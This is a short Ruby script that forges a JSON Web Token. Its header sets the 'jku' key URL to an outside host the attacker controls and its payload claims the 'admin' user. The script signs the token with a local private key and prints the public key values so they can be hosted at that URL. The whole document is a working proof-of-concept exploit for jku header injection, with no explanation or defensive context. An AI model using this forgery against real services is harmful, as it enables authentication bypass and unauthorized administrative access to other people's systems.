
header = {"typ":"JWT","alg":"RS256","jku":"https://[PUBLIC_IP]/mykey.json"}

payload = {"user":"admin"}

require 'base64'
require 'openssl'
require 'json'

token = Base64.urlsafe_encode64(header.to_json).gsub(/=+$/,"")+"."
token += Base64.urlsafe_encode64(payload.to_json).gsub(/=+$/,"")

priv = OpenSSL::PKey::RSA.new File.read 'private.pem'
pub = priv.public_key
n = Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/,"")
e = Base64.urlsafe_encode64(pub.e.to_s(2)).gsub(/=+$/,"")

puts n
puts e

sign = priv.sign("SHA256", token)

puts token+"."+Base64.urlsafe_encode64(sign).gsub(/=+$/,"")
